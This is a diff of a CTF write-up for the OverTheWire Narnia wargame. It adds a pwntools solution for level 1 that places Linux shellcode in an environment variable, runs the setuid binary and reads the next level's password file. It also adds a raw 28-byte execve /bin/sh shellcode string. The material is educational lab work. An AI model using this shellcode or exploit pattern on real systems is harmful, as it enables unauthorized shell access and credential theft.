@@ -216,7 +216,6 @@ print(str(shell.recvline(), 'utf-8'))
 - Code
 ```py
 from pwn import *
-from pwn import *
 session = ssh(host='narnia.labs.overthewire.org', port=2226, user='narnia0', password='narnia0')
 shell = session.process('sh')
 
@@ -229,3 +228,43 @@ shell.interactive()
 ![img](assets/9-int-shell-script.png)
 	</p>
 </details>
+
+<details>
+	<summary>:heavy_check_mark: Using Shellcraft</summary>
+	<p>
+- Shellcode taken from - [here](http://shell-storm.org/shellcode/files/shellcode-811.php)
+- Shellcodes are instructions which the processor executes, these are hexadecimal characters 0x00 to 0xff 
+- Every compiled application / program finally transforms into processor instructions inorder to execute
+- The obtain shellcode from the above link is loaded in to the variable EGG with python (cause python2 handles all strings as 
+bytes)
+
+![img](assets/10-shellcode.png)
+
+- Code
+```py
+from pwn import *
+session = ssh(host='narnia.labs.overthewire.org', port=2226, user='narnia0', password='narnia0')
+
+# generating the shellcode with pwntools
+# shellcraft.linux.sh() - provides instructions to be performed in order to obtain shell
+# asm() - converts the processor instructions to its equivalent opcodes
+payload = asm(shellcraft.linux.sh())
+
+shell = session.process('sh', env={"EGG":payload})
+shell.sendline("/narnia/narnia1")
+
+# obtains pseudo interactive shell as narnia2
+shell.interactive()
+
+shell.sendline("cat /etc/narnia_pass/narnia2")
+
+```
+</details>
+
+
+
+
+
+## Often Used
+
+28 bytes shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
